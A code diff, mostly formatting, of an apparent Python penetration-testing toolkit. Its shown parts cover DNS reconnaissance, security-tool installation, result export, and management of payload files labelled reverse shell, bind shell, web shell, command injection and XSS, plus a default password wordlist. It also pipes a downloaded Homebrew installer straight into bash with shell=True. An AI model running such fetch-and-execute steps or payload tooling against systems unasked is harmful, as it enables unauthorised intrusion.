-                    cmd = ["dig", "+nocmd", "+noall", "+answer", "+multiline", domain, record_type]
-                    result = run_command(cmd, capture_output=True, check=False, timeout=5)
+                    cmd = [
+                        "dig",
+                        "+nocmd",
+                        "+noall",
+                        "+answer",
+                        "+multiline",
+                        domain,
+                        record_type,
+                    ]
+                    result = run_command(
+                        cmd, capture_output=True, check=False, timeout=5
+                    )
 
                     if result.stdout:
                         records = []
@@ -3876,7 +4414,9 @@ def dns_reconnaissance():
                         results[record_type] = [f"{domain}. IN A {ip}"]
                     elif record_type == "MX" and shutil.which("host"):
                         mx_cmd = ["host", "-t", "MX", domain]
-                        mx_result = run_command(mx_cmd, capture_output=True, check=False, timeout=5)
+                        mx_result = run_command(
+                            mx_cmd, capture_output=True, check=False, timeout=5
+                        )
 
                         if mx_result.stdout:
                             mx_records = []
@@ -3893,11 +4433,7 @@ def dns_reconnaissance():
 
     # Display results
     console.print()
-    display_panel(
-        "DNS Reconnaissance Results",
-        f"Domain: {domain}",
-        NordColors.FROST_2
-    )
+    display_panel("DNS Reconnaissance Results", f"Domain: {domain}", NordColors.FROST_2)
 
     if results:
         for record_type, records in results.items():
@@ -3921,8 +4457,12 @@ def dns_reconnaissance():
         filename = f"dns_recon_{domain.replace('.', '_')}_{timestamp}.json"
 
         save_result_to_file(
-            {"domain": domain, "records": results, "timestamp": datetime.datetime.now().isoformat()},
-            filename
+            {
+                "domain": domain,
+                "records": results,
+                "timestamp": datetime.datetime.now().isoformat(),
+            },
+            filename,
         )
 
 
@@ -3930,9 +4470,7 @@ def tool_management_module():
     console.clear()
     console.print(create_header())
     display_panel(
-        "Tool Management",
-        "Install and manage security tools.",
-        NordColors.FROST_4
+        "Tool Management", "Install and manage security tools.", NordColors.FROST_4
     )
 
     options = [
@@ -3940,7 +4478,7 @@ def tool_management_module():
         ("2", "Install Tools", "Install missing security tools"),
         ("3", "Update Tools", "Update installed tools"),
         ("4", "Manage Homebrew", "Install and update Homebrew"),
-        ("0", "Return", "Return to Main Menu")
+        ("0", "Return", "Return to Main Menu"),
     ]
 
     console.print(create_menu_table("Tool Management Options", options))
@@ -3987,8 +4525,11 @@ def show_installed_tools():
         table.add_column("Description", style=NordColors.FROST_3)
 
         for tool in sorted(tools, key=lambda x: x.name):
-            status = f"[bold {NordColors.GREEN}]● INSTALLED[/]" if tool_status.get(tool.name,
-                                                                                   False) else f"[dim {NordColors.RED}]○ NOT INSTALLED[/]"
+            status = (
+                f"[bold {NordColors.GREEN}]● INSTALLED[/]"
+                if tool_status.get(tool.name, False)
+                else f"[dim {NordColors.RED}]○ NOT INSTALLED[/]"
+            )
             table.add_row(tool.name, status, tool.description)
 
         console.print(table)
@@ -4000,7 +4541,7 @@ def show_installed_tools():
     display_panel(
         "Installation Summary",
         f"{installed_count} out of {total_count} tools installed ({installed_count / total_count * 100:.1f}%)",
-        NordColors.FROST_4
+        NordColors.FROST_4,
     )
 
 
@@ -4014,13 +4555,13 @@ def install_tools():
 
     # Check tools
     tool_status = get_tool_status([tool.name for tool in SECURITY_TOOLS])
-    missing_tools = [tool for tool in SECURITY_TOOLS if not tool_status.get(tool.name, False)]
+    missing_tools = [
+        tool for tool in SECURITY_TOOLS if not tool_status.get(tool.name, False)
+    ]
 
     if not missing_tools:
         display_panel(
-            "Installation Status",
-            "All tools are already installed!",
-            NordColors.GREEN
+            "Installation Status", "All tools are already installed!", NordColors.GREEN
         )
         return
 
@@ -4036,7 +4577,9 @@ def install_tools():
     table.add_column("Description", style=NordColors.FROST_4)
 
     for i, tool in enumerate(missing_tools, 1):
-        table.add_row(str(i), tool.name, tool.category.value.capitalize(), tool.description)
+        table.add_row(
+            str(i), tool.name, tool.category.value.capitalize(), tool.description
+        )
 
     console.print(table)
 
@@ -4056,11 +4599,17 @@ def install_tools():
     elif install_option == 1:
         tools_to_install = missing_tools
     elif install_option == 2:
-        tool_selection = get_user_input("Enter tool numbers to install (comma-separated, e.g. 1,3,5)")
+        tool_selection = get_user_input(
+            "Enter tool numbers to install (comma-separated, e.g. 1,3,5)"
+        )
 
         try:
             selected_indices = [int(i.strip()) - 1 for i in tool_selection.split(",")]
-            tools_to_install = [missing_tools[i] for i in selected_indices if 0 <= i < len(missing_tools)]
+            tools_to_install = [
+                missing_tools[i]
+                for i in selected_indices
+                if 0 <= i < len(missing_tools)
+            ]
         except ValueError:
             print_error("Invalid selection")
             return
@@ -4071,12 +4620,20 @@ def install_tools():
         for i, category in enumerate(categories, 1):
             console.print(f"  {i}. {category.capitalize()}")
 
-        cat_selection = get_user_input("Enter category numbers to install (comma-separated, e.g. 1,3)")
+        cat_selection = get_user_input(
+            "Enter category numbers to install (comma-separated, e.g. 1,3)"
+        )
 
         try:
             selected_indices = [int(i.strip()) - 1 for i in cat_selection.split(",")]
-            selected_categories = [categories[i] for i in selected_indices if 0 <= i < len(categories)]
-            tools_to_install = [tool for tool in missing_tools if tool.category.value in selected_categories]
+            selected_categories = [
+                categories[i] for i in selected_indices if 0 <= i < len(categories)
+            ]
+            tools_to_install = [
+                tool
+                for tool in missing_tools
+                if tool.category.value in selected_categories
+            ]
         except ValueError:
             print_error("Invalid selection")
             return
@@ -4086,11 +4643,15 @@ def install_tools():
         return
 
     # Confirm installation
-    if not get_confirmation(f"Install {len(tools_to_install)} tools? This may take a while."):
+    if not get_confirmation(
+        f"Install {len(tools_to_install)} tools? This may take a while."
+    ):
         return
 
     # Install tools
-    progress, task = display_progress(len(tools_to_install), "Installing tools", NordColors.FROST_4)
+    progress, task = display_progress(
+        len(tools_to_install), "Installing tools", NordColors.FROST_4
+    )
 
     installed = []
     failed = []
@@ -4113,23 +4674,31 @@ def install_tools():
                     try:
                         if method == InstallMethod.BREW:
                             cmd = ["brew", "install", value]
-                            run_command(cmd, capture_output=True, check=True, timeout=300)
+                            run_command(
+                                cmd, capture_output=True, check=True, timeout=300
+                            )
                             success = True
                             break
                         elif method == InstallMethod.BREW_CASK:
                             cmd = ["brew", "install", "--cask", value]
-                            run_command(cmd, capture_output=True, check=True, timeout=300)
+                            run_command(
+                                cmd, capture_output=True, check=True, timeout=300
+                            )
                             success = True
                             break
                         elif method == InstallMethod.CUSTOM:
                             # Split command string and run
                             cmd_parts = value.split()
-                            run_command(cmd_parts, capture_output=True, check=True, timeout=300)
+                            run_command(
+                                cmd_parts, capture_output=True, check=True, timeout=300
+                            )
                             success = True
                             break
                         elif method == InstallMethod.PIP:
                             cmd = [sys.executable, "-m", "pip", "install", value]
-                            run_command(cmd, capture_output=True, check=True, timeout=300)
+                            run_command(
+                                cmd, capture_output=True, check=True, timeout=300
+                            )
                             success = True
                             break
                         elif method == InstallMethod.GIT:
@@ -4138,7 +4707,9 @@ def install_tools():
                             git_dir.mkdir(exist_ok=True)
                             repo_name = value.split("/")[-1].replace(".git", "")
                             cmd = ["git", "clone", value, str(git_dir / repo_name)]
-                            run_command(cmd, capture_output=True, check=True, timeout=300)
+                            run_command(
+                                cmd, capture_output=True, check=True, timeout=300
+                            )
                             success = True
                             break
                     except Exception as e:
@@ -4166,7 +4737,7 @@ def install_tools():
         display_panel(
             "Installation Successful",
             f"Successfully installed {len(installed)} tools:\n" + ", ".join(installed),
-            NordColors.GREEN
+            NordColors.GREEN,
         )
 
     if failed:
@@ -4192,15 +4763,21 @@ def update_tools():
     if get_confirmation("Update Homebrew first?"):
         try:
             with console.status(f"[bold {NordColors.FROST_2}]Updating Homebrew...[/]"):
-                run_command(["brew", "update"], capture_output=True, check=False, timeout=120)
+                run_command(
+                    ["brew", "update"], capture_output=True, check=False, timeout=120
+                )
             print_success("Homebrew updated")
         except Exception as e:
             print_error(f"Homebrew update failed: {e}")
 
     if get_confirmation("Update all installed Homebrew packages?"):
         try:
-            with console.status(f"[bold {NordColors.FROST_2}]Updating packages... This may take a while.[/]"):
-                result = run_command(["brew", "upgrade"], capture_output=True, check=False, timeout=600)
+            with console.status(
+                f"[bold {NordColors.FROST_2}]Updating packages... This may take a while.[/]"
+            ):
+                result = run_command(
+                    ["brew", "upgrade"], capture_output=True, check=False, timeout=600
+                )
 
             if "already installed" in result.stdout:
                 print_success("All packages are already up to date")
@@ -4214,9 +4791,15 @@ def update_tools():
             packages = ["requests", "rich", "pyfiglet", "prompt_toolkit", "scapy"]
 
             for package in packages:
-                with console.status(f"[bold {NordColors.FROST_2}]Updating {package}...[/]"):
-                    run_command([sys.executable, "-m", "pip", "install", "--upgrade", package],
-                                capture_output=True, check=False, timeout=60)
+                with console.status(
+                    f"[bold {NordColors.FROST_2}]Updating {package}...[/]"
+                ):
+                    run_command(
+                        [sys.executable, "-m", "pip", "install", "--upgrade", package],
+                        capture_output=True,
+                        check=False,
+                        timeout=60,
+                    )
 
             print_success("Python packages updated")
         except Exception as e:
@@ -4226,16 +4809,14 @@ def update_tools():
 def manage_homebrew():
     if shutil.which("brew"):
         display_panel(
-            "Homebrew Status",
-            "Homebrew is already installed.",
-            NordColors.GREEN
+            "Homebrew Status", "Homebrew is already installed.", NordColors.GREEN
         )
 
         options = [
             ("1", "Update Homebrew", "Update Homebrew package managers"),
             ("2", "Upgrade All Packages", "Upgrade all installed packages"),
             ("3", "Cleanup", "Remove old versions and cache"),
-            ("0", "Return", "Return to Tool Management")
+            ("0", "Return", "Return to Tool Management"),
         ]
 
         console.print(create_menu_table("Homebrew Management", options))
@@ -4246,22 +4827,43 @@ def manage_homebrew():
             return
         elif choice == 1:
             try:
-                with console.status(f"[bold {NordColors.FROST_2}]Updating Homebrew...[/]"):
-                    run_command(["brew", "update"], capture_output=True, check=False, timeout=120)
+                with console.status(
+                    f"[bold {NordColors.FROST_2}]Updating Homebrew...[/]"
+                ):
+                    run_command(
+                        ["brew", "update"],
+                        capture_output=True,
+                        check=False,
+                        timeout=120,
+                    )
                 print_success("Homebrew updated")
             except Exception as e:
                 print_error(f"Homebrew update failed: {e}")
         elif choice == 2:
             try:
-                with console.status(f"[bold {NordColors.FROST_2}]Upgrading packages... This may take a while.[/]"):
-                    run_command(["brew", "upgrade"], capture_output=True, check=False, timeout=600)
+                with console.status(
+                    f"[bold {NordColors.FROST_2}]Upgrading packages... This may take a while.[/]"
+                ):
+                    run_command(
+                        ["brew", "upgrade"],
+                        capture_output=True,
+                        check=False,
+                        timeout=600,
+                    )
                 print_success("Packages upgraded")
             except Exception as e:
                 print_error(f"Package upgrade failed: {e}")
         elif choice == 3:
             try:
-                with console.status(f"[bold {NordColors.FROST_2}]Cleaning up Homebrew...[/]"):
-                    run_command(["brew", "cleanup"], capture_output=True, check=False, timeout=120)
+                with console.status(
+                    f"[bold {NordColors.FROST_2}]Cleaning up Homebrew...[/]"
+                ):
+                    run_command(
+                        ["brew", "cleanup"],
+                        capture_output=True,
+                        check=False,
+                        timeout=120,
+                    )
                 print_success("Homebrew cleanup completed")
             except Exception as e:
                 print_error(f"Homebrew cleanup failed: {e}")
@@ -4269,16 +4871,23 @@ def manage_homebrew():
         display_panel(
             "Homebrew Status",
             "Homebrew is not installed. Homebrew is required to install most security tools.",
-            NordColors.RED
+            NordColors.RED,
         )
 
         if get_confirmation("Install Homebrew now?"):
-            homebrew_url = "https://raw.githubusercontent.com/Homebrew/install/master/install.sh"
+            homebrew_url = (
+                "https://raw.githubusercontent.com/Homebrew/install/master/install.sh"
+            )
 
             try:
-                with console.status(f"[bold {NordColors.FROST_2}]Installing Homebrew... This may take a while.[/]"):
-                    subprocess.run("/bin/bash -c \"$(curl -fsSL " + homebrew_url + ")\"",
-                                   shell=True, check=True)
+                with console.status(
+                    f"[bold {NordColors.FROST_2}]Installing Homebrew... This may take a while.[/]"
+                ):
+                    subprocess.run(
+                        '/bin/bash -c "$(curl -fsSL ' + homebrew_url + ')"',
+                        shell=True,
+                        check=True,
+                    )
                 print_success("Homebrew installed successfully")
             except Exception as e:
                 print_error(f"Homebrew installation failed: {e}")
@@ -4289,9 +4898,7 @@ def settings_module():
     console.clear()
     console.print(create_header())
     display_panel(
-        "Settings",
-        "Configure application settings and options.",
-        NordColors.FROST_4
+        "Settings", "Configure application settings and options.", NordColors.FROST_4
     )
 
     options = [
@@ -4300,7 +4907,7 @@ def settings_module():
         ("3", "Manage Payloads", "View, export, or delete payloads"),
         ("4", "Manage Wordlists", "Add, edit, or delete wordlists"),
         ("5", "System Information", "View system information"),
-        ("0", "Return", "Return to Main Menu")
+        ("0", "Return", "Return to Main Menu"),
     ]
 
     console.print(create_menu_table("Settings Options", options))
@@ -4342,11 +4949,19 @@ def manage_configuration():
     console.print(table)
 
     options = [
-        ("1", "Change Default Threads", f"Current: {config.get('threads', DEFAULT_THREADS)}"),
-        ("2", "Change Default Timeout", f"Current: {config.get('timeout', DEFAULT_TIMEOUT)}"),
+        (
+            "1",
+            "Change Default Threads",
+            f"Current: {config.get('threads', DEFAULT_THREADS)}",
+        ),
+        (
+            "2",
+            "Change Default Timeout",
+            f"Current: {config.get('timeout', DEFAULT_TIMEOUT)}",
+        ),
         ("3", "Change User Agent", f"Current: {config.get('user_agent', 'Default')}"),
         ("4", "Reset to Defaults", "Restore default configuration"),
-        ("0", "Return", "Return to Settings")
+        ("0", "Return", "Return to Settings"),
     ]
 
     console.print(create_menu_table("Configuration Options", options))
@@ -4373,7 +4988,9 @@ def manage_configuration():
             console.print(f"  {i}. {agent}")
         console.print(f"  {len(USER_AGENTS) + 1}. Custom")
 
-        agent_choice = get_integer_input(f"Select user agent (1-{len(USER_AGENTS) + 1})", 1, len(USER_AGENTS) + 1)
+        agent_choice = get_integer_input(
+            f"Select user agent (1-{len(USER_AGENTS) + 1})", 1, len(USER_AGENTS) + 1
+        )
 
         if agent_choice > 0:
             if agent_choice <= len(USER_AGENTS):
@@ -4436,14 +5053,14 @@ def manage_results():
         display_panel(
             "Results Management",
             "No results found. Run some scans or reconnaissance first.",
-            NordColors.YELLOW
+            NordColors.YELLOW,
         )
         return
 
     # Group by type
     result_types = {}
     for file in results_files:
-        prefix = file.name.split('_')[0]
+        prefix = file.name.split("_")[0]
         if prefix not in result_types:
             result_types[prefix] = []
         result_types[prefix].append(file)
@@ -4456,7 +5073,7 @@ def manage_results():
         ("2", "Search Results", "Search for specific results"),
         ("3", "Export Results", "Export results to another format"),
         ("4", "Delete Results", "Delete selected results"),
-        ("0", "Return", "Return to Settings")
+        ("0", "Return", "Return to Settings"),
     ]
 
     console.print(create_menu_table("Results Management", options))
@@ -4480,7 +5097,9 @@ def view_results_by_type(sorted_types):
     for i, (type_name, files) in enumerate(sorted_types, 1):
         console.print(f"  {i}. {type_name} ({len(files)} files)")
 
-    type_choice = get_integer_input(f"Select type (1-{len(sorted_types)})", 1, len(sorted_types))
+    type_choice = get_integer_input(
+        f"Select type (1-{len(sorted_types)})", 1, len(sorted_types)
+    )
     if type_choice <= 0:
         return
 
@@ -4517,7 +5136,9 @@ def view_results_by_type(sorted_types):
 
     console.print(table)
 
-    file_choice = get_integer_input(f"Select file to view (1-{len(files)})", 1, len(files))
+    file_choice = get_integer_input(
+        f"Select file to view (1-{len(files)})", 1, len(files)
+    )
     if file_choice <= 0:
         return
 
@@ -4550,7 +5171,9 @@ def search_results(results_files):
 
     matching_files = []
 
-    progress, task = display_progress(len(results_files), "Searching results", NordColors.FROST_2)
+    progress, task = display_progress(
+        len(results_files), "Searching results", NordColors.FROST_2
+    )
 
     with progress:
         for file in results_files:
@@ -4558,7 +5181,10 @@ def search_results(results_files):
                 with open(file, "r") as f:
                     content = f.read()
 
-                if search_term.lower() in content.lower() or search_term.lower() in file.name.lower():
+                if (
+                    search_term.lower() in content.lower()
+                    or search_term.lower() in file.name.lower()
+                ):
                     matching_files.append(file)
             except Exception:
                 pass
@@ -4567,9 +5193,7 @@ def search_results(results_files):
 
     if not matching_files:
         display_panel(
-            "Search Results",
-            f"No results found for '{search_term}'",
-            NordColors.YELLOW
+            "Search Results", f"No results found for '{search_term}'", NordColors.YELLOW
         )
         return
 
@@ -4591,7 +5215,9 @@ def search_results(results_files):
 
     console.print(table)
 
-    file_choice = get_integer_input(f"Select file to view (1-{len(matching_files)})", 1, len(matching_files))
+    file_choice = get_integer_input(
+        f"Select file to view (1-{len(matching_files)})", 1, len(matching_files)
+    )
     if file_choice <= 0:
         return
 
@@ -4605,9 +5231,7 @@ def export_results(results_files):
 
     if not json_files:
         display_panel(
-            "Export Results",
-            "No JSON results found to export.",
-            NordColors.YELLOW
+            "Export Results", "No JSON results found to export.", NordColors.YELLOW
         )
         return
 
@@ -4624,7 +5248,9 @@ def export_results(results_files):
 
     console.print(table)
 
-    file_choice = get_integer_input(f"Select file to export (1-{len(json_files)})", 1, len(json_files))
+    file_choice = get_integer_input(
+        f"Select file to export (1-{len(json_files)})", 1, len(json_files)
+    )
     if file_choice <= 0:
         return
 
@@ -4677,7 +5303,9 @@ def export_to_csv(data, source_file):
                 for category, items in data["data"].items():
                     if isinstance(items, dict):
                         for key, value in items.items():
-                            flat_data.append({"category": category, "key": key, "value": str(value)})
+                            flat_data.append(
+                                {"category": category, "key": key, "value": str(value)}
+                            )
                     elif isinstance(items, list):
                         for item in items:
                             if isinstance(item, dict):
@@ -4685,14 +5313,26 @@ def export_to_csv(data, source_file):
                                 row.update({k: str(v) for k, v in item.items()})
                                 flat_data.append(row)
                             else:
-                                flat_data.append({"category": category, "value": str(item)})
+                                flat_data.append(
+                                    {"category": category, "value": str(item)}
+                                )
             else:
                 # Generic handling
-                flat_data.append({k: str(v) if isinstance(v, (dict, list)) else v for k, v in data.items()})
+                flat_data.append(
+                    {
+                        k: str(v) if isinstance(v, (dict, list)) else v
+                        for k, v in data.items()
+                    }
+                )
         elif isinstance(data, list):
             for item in data:
                 if isinstance(item, dict):
-                    flat_data.append({k: str(v) if isinstance(v, (dict, list)) else v for k, v in item.items()})
+                    flat_data.append(
+                        {
+                            k: str(v) if isinstance(v, (dict, list)) else v
+                            for k, v in item.items()
+                        }
+                    )
                 else:
                     flat_data.append({"value": str(item)})
 
@@ -4701,6 +5341,7 @@ def export_to_csv(data, source_file):
 
         # Write CSV
         import csv
+
         with open(output_file, "w", newline="") as f:
             if flat_data:
                 writer = csv.DictWriter(f, fieldnames=flat_data[0].keys())
@@ -4753,18 +5394,24 @@ def export_to_html(data, source_file):
             if "timestamp" in data:
                 try:
                     timestamp = datetime.datetime.fromisoformat(data["timestamp"])
-                    html += f"<p>Scan Time: {timestamp.strftime('%Y-%m-%d %H:%M:%S')}</p>\n"
+                    html += (
+                        f"<p>Scan Time: {timestamp.strftime('%Y-%m-%d %H:%M:%S')}</p>\n"
+                    )
                 except Exception:
                     html += f"<p>Timestamp: {data['timestamp']}</p>\n"
 
             if "port_data" in data:
                 html += "<h2>Port Scan Results</h2>\n"
-                html += "<table>\n<tr><th>Port</th><th>Service</th><th>State</th></tr>\n"
+                html += (
+                    "<table>\n<tr><th>Port</th><th>Service</th><th>State</th></tr>\n"
+                )
 
                 for port, info in data["port_data"].items():
                     service = info.get("service", "unknown")
                     state = info.get("state", "unknown")
-                    html += f"<tr><td>{port}</td><td>{service}</td><td>{state}</td></tr>\n"
+                    html += (
+                        f"<tr><td>{port}</td><td>{service}</td><td>{state}</td></tr>\n"
+                    )
 
                 html += "</table>\n"
 
@@ -4799,8 +5446,12 @@ def export_to_html(data, source_file):
                         html += "</ul>\n"
 
             # Add remaining data as JSON
-            other_data = {k: v for k, v in data.items()
-                          if k not in ["target", "timestamp", "port_data", "vulnerabilities", "data"]}
+            other_data = {
+                k: v
+                for k, v in data.items()
+                if k
+                not in ["target", "timestamp", "port_data", "vulnerabilities", "data"]
+            }
 
             if other_data:
                 html += "<h2>Additional Data</h2>\n"
@@ -4830,7 +5481,9 @@ def export_to_text(data, source_file):
     try:
         with open(output_file, "w") as f:
             f.write(f"Report: {source_file.stem}\n")
-            f.write(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+            f.write(
+                f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            )
 
             if isinstance(data, dict):
                 for key, value in data.items():
@@ -4874,7 +5527,7 @@ def delete_results(results_files):
         date_str = mtime.strftime("%Y-%m-%d %H:%M:%S")
 
         # Determine type
-        file_type = file.name.split('_')[0]
+        file_type = file.name.split("_")[0]
 
         table.add_row(str(i), file.name, file_type, date_str)
 
@@ -4891,17 +5544,25 @@ def delete_results(results_files):
     if delete_option == 0:
         return
     elif delete_option == 1:
-        file_selection = get_user_input("Enter file numbers to delete (comma-separated, e.g. 1,3,5)")
+        file_selection = get_user_input(
+            "Enter file numbers to delete (comma-separated, e.g. 1,3,5)"
+        )
 
         try:
             selected_indices = [int(i.strip()) - 1 for i in file_selection.split(",")]
-            files_to_delete = [results_files[i] for i in selected_indices if 0 <= i < len(results_files)]
+            files_to_delete = [
+                results_files[i]
+                for i in selected_indices
+                if 0 <= i < len(results_files)
+            ]
 
             if not files_to_delete:
                 print_error("No valid files selected")
                 return
 
-            if get_confirmation(f"Delete {len(files_to_delete)} files? This cannot be undone."):
+            if get_confirmation(
+                f"Delete {len(files_to_delete)} files? This cannot be undone."
+            ):
                 for file in files_to_delete:
                     file.unlink()
                 print_success(f"Deleted {len(files_to_delete)} files")
@@ -4911,7 +5572,7 @@ def delete_results(results_files):
         # Group by type
         result_types = {}
         for file in results_files:
-            prefix = file.name.split('_')[0]
+            prefix = file.name.split("_")[0]
             if prefix not in result_types:
                 result_types[prefix] = []
             result_types[prefix].append(file)
@@ -4920,19 +5581,25 @@ def delete_results(results_files):
         for i, (type_name, files) in enumerate(result_types.items(), 1):
             console.print(f"  {i}. {type_name} ({len(files)} files)")
 
-        type_choice = get_integer_input(f"Select type to delete (1-{len(result_types)})", 1, len(result_types))
+        type_choice = get_integer_input(
+            f"Select type to delete (1-{len(result_types)})", 1, len(result_types)
+        )
         if type_choice <= 0:
             return
 
         selected_type = list(result_types.keys())[type_choice - 1]
         files_to_delete = result_types[selected_type]
 
-        if get_confirmation(f"Delete all {len(files_to_delete)} {selected_type} files? This cannot be undone."):
+        if get_confirmation(
+            f"Delete all {len(files_to_delete)} {selected_type} files? This cannot be undone."
+        ):
             for file in files_to_delete:
                 file.unlink()
             print_success(f"Deleted {len(files_to_delete)} files")
     elif delete_option == 3:
-        if get_confirmation(f"Delete ALL {len(results_files)} result files? This CANNOT be undone."):
+        if get_confirmation(
+            f"Delete ALL {len(results_files)} result files? This CANNOT be undone."
+        ):
             if get_confirmation("Are you REALLY sure? ALL results will be lost."):
                 for file in results_files:
                     file.unlink()
@@ -4946,7 +5613,7 @@ def manage_payloads():
         display_panel(
             "Payload Management",
             "No payloads found. Generate some payloads first.",
-            NordColors.YELLOW
+            NordColors.YELLOW,
         )
         return
 
@@ -4955,7 +5622,14 @@ def manage_payloads():
     for file in payload_files:
         # Try to determine payload type from filename
         prefix = "unknown"
-        for pt in ["reverse_shell", "bind_shell", "web_shell", "cmd_injection", "xss", "password"]:
+        for pt in [
+            "reverse_shell",
+            "bind_shell",
+            "web_shell",
+            "cmd_injection",
+            "xss",
+            "password",
+        ]:
             if pt in file.name:
                 prefix = pt
                 break
@@ -4968,7 +5642,7 @@ def manage_payloads():
         ("1", "View Payloads", "Browse and view payload files"),
         ("2", "Export Payloads", "Export payloads to another location"),
         ("3", "Delete Payloads", "Delete selected payloads"),
-        ("0", "Return", "Return to Settings")
+        ("0", "Return", "Return to Settings"),
     ]
 
     console.print(create_menu_table("Payload Management", options))
@@ -4990,7 +5664,9 @@ def view_payloads(payload_types):
     for i, (type_name, files) in enumerate(payload_types.items(), 1):
         console.print(f"  {i}. {type_name} ({len(files)} files)")
 
-    type_choice = get_integer_input(f"Select type (1-{len(payload_types)})", 1, len(payload_types))
+    type_choice = get_integer_input(
+        f"Select type (1-{len(payload_types)})", 1, len(payload_types)
+    )
     if type_choice <= 0:
         return
 
@@ -5020,7 +5696,9 @@ def view_payloads(payload_types):
 
     console.print(table)
 
-    file_choice = get_integer_input(f"Select file to view (1-{len(files)})", 1, len(files))
+    file_choice = get_integer_input(
+        f"Select file to view (1-{len(files)})", 1, len(files)
+    )
     if file_choice <= 0:
         return
 
@@ -5072,7 +5750,14 @@ def export_payloads(payload_files):
     for i, file in enumerate(payload_files, 1):
         # Determine type
         file_type = "Unknown"
-        for pt in ["reverse_shell", "bind_shell", "web_shell", "cmd_injection", "xss", "password"]:
+        for pt in [
+            "reverse_shell",
+            "bind_shell",
+            "web_shell",
+            "cmd_injection",
+            "xss",
+            "password",
+        ]:
             if pt in file.name:
                 file_type = pt.replace("_", " ").title()
                 break
@@ -5107,11 +5792,17 @@ def export_payloads(payload_files):
     files_to_export = []
 
     if export_option == 1:
-        file_selection = get_user_input("Enter file numbers to export (comma-separated, e.g. 1,3,5)")
+        file_selection = get_user_input(
+            "Enter file numbers to export (comma-separated, e.g. 1,3,5)"
+        )
 
         try:
             selected_indices = [int(i.strip()) - 1 for i in file_selection.split(",")]
-            files_to_export = [payload_files[i] for i in selected_indices if 0 <= i < len(payload_files)]
+            files_to_export = [
+                payload_files[i]
+                for i in selected_indices
+                if 0 <= i < len(payload_files)
+            ]
 
             if not files_to_export:
                 print_error("No valid files selected")
@@ -5150,7 +5841,14 @@ def delete_payloads(payload_files):
     for i, file in enumerate(payload_files, 1):
         # Determine type
         file_type = "Unknown"
-        for pt in ["reverse_shell", "bind_shell", "web_shell", "cmd_injection", "xss", "password"]:
+        for pt in [
+            "reverse_shell",
+            "bind_shell",
+            "web_shell",
+            "cmd_injection",
+            "xss",
+            "password",
+        ]:
             if pt in file.name:
                 file_type = pt.replace("_", " ").title()
                 break
@@ -5170,24 +5868,34 @@ def delete_payloads(payload_files):
         return
 
     if delete_option == 1:
-        file_selection = get_user_input("Enter file numbers to delete (comma-separated, e.g. 1,3,5)")
+        file_selection = get_user_input(
+            "Enter file numbers to delete (comma-separated, e.g. 1,3,5)"
+        )
 
         try:
             selected_indices = [int(i.strip()) - 1 for i in file_selection.split(",")]
-            files_to_delete = [payload_files[i] for i in selected_indices if 0 <= i < len(payload_files)]
+            files_to_delete = [
+                payload_files[i]
+                for i in selected_indices
+                if 0 <= i < len(payload_files)
+            ]
 
             if not files_to_delete:
                 print_error("No valid files selected")
                 return
 
-            if get_confirmation(f"Delete {len(files_to_delete)} files? This cannot be undone."):
+            if get_confirmation(
+                f"Delete {len(files_to_delete)} files? This cannot be undone."
+            ):
                 for file in files_to_delete:
                     file.unlink()
                 print_success(f"Deleted {len(files_to_delete)} files")
         except ValueError:
             print_error("Invalid selection")
     else:
-        if get_confirmation(f"Delete ALL {len(payload_files)} payload files? This CANNOT be undone."):
+        if get_confirmation(
+            f"Delete ALL {len(payload_files)} payload files? This CANNOT be undone."
+        ):
             if get_confirmation("Are you REALLY sure? ALL payloads will be lost."):
                 for file in payload_files:
                     file.unlink()
@@ -5198,9 +5906,16 @@ def manage_wordlists():
     wordlist_files = list(WORDLISTS_DIR.glob("*.txt"))
 
     default_wordlists = {
-        "web_dirs.txt": ["admin", "login", "wp-admin", "dashboard", "images", "uploads"],
+        "web_dirs.txt": [
+            "admin",
+            "login",
+            "wp-admin",
+            "dashboard",
+            "images",
+            "uploads",
+        ],
         "passwords.txt": ["password123", "admin", "12345678", "qwerty", "letmein"],
-        "subdomains.txt": ["www", "mail", "admin", "webmail", "dev", "test"]
+        "subdomains.txt": ["www", "mail", "admin", "webmail", "dev", "test"],
     }
 
     # Create default wordlists if they don't exist
@@ -5219,7 +5934,7 @@ def manage_wordlists():
         ("2", "Create Wordlist", "Create a new wordlist"),
         ("3", "Edit Wordlist", "Modify an existing wordlist"),
         ("4", "Import Wordlist", "Import wordlist from another location"),
-        ("0", "Return", "Return to Settings")
+        ("0", "Return", "Return to Settings"),
     ]
 
     console.print(create_menu_table("Wordlist Management", options))
@@ -5240,11 +5955,7 @@ def manage_wordlists():
 
 def view_wordlists(wordlist_files):
     if not wordlist_files:
-        display_panel(
-            "Wordlists",
-            "No wordlists found.",
-            NordColors.YELLOW
-        )
+        display_panel("Wordlists", "No wordlists found.", NordColors.YELLOW)
         return
 
     table = Table(
@@ -5278,7 +5989,9 @@ def view_wordlists(wordlist_files):
 
     console.print(table)
 
-    file_choice = get_integer_input(f"Select wordlist to view (1-{len(wordlist_files)})", 1, len(wordlist_files))
+    file_choice = get_integer_input(
+        f"Select wordlist to view (1-{len(wordlist_files)})", 1, len(wordlist_files)
+    )
     if file_choice <= 0:
         return
 
@@ -5303,7 +6016,9 @@ def view_wordlists(wordlist_files):
         console.print(preview_table)
 
         if len(words) > preview_count:
-            console.print(f"[bold {NordColors.YELLOW}]Showing first {preview_count} of {len(words)} words[/]")
+            console.print(
+                f"[bold {NordColors.YELLOW}]Showing first {preview_count} of {len(words)} words[/]"
+            )
     except Exception as e:
         print_error(f"Error reading wordlist: {e}")
 
@@ -5332,7 +6047,9 @@ def create_wordlist():
     words = []
 
     if option == 1:
-        console.print(f"[bold {NordColors.FROST_2}]Enter words (one per line, empty line to finish):[/]")
+        console.print(
+            f"[bold {NordColors.FROST_2}]Enter words (one per line, empty line to finish):[/]"
+        )
 
         while True:
             word = get_user_input("")
@@ -5341,7 +6058,9 @@ def create_wordlist():
             words.append(word)
     elif option == 2:
         pattern_type = get_integer_input(
-            "Select pattern type: 1) Name variations, 2) Number sequences, 3) Common passwords", 1, 3
+            "Select pattern type: 1) Name variations, 2) Number sequences, 3) Common passwords",
+            1,
+            3,
         )
 
         if pattern_type == 1:
@@ -5350,16 +6069,18 @@ def create_wordlist():
                 name_list = [name.strip() for name in names.split(",")]
 
                 for name in name_list:
-                    words.extend([
-                        name.lower(),
-                        name.upper(),
-                        name.capitalize(),
-                        f"{name}123",
-                        f"{name}2023",
-                        f"{name}2024",
-                        f"{name}!",
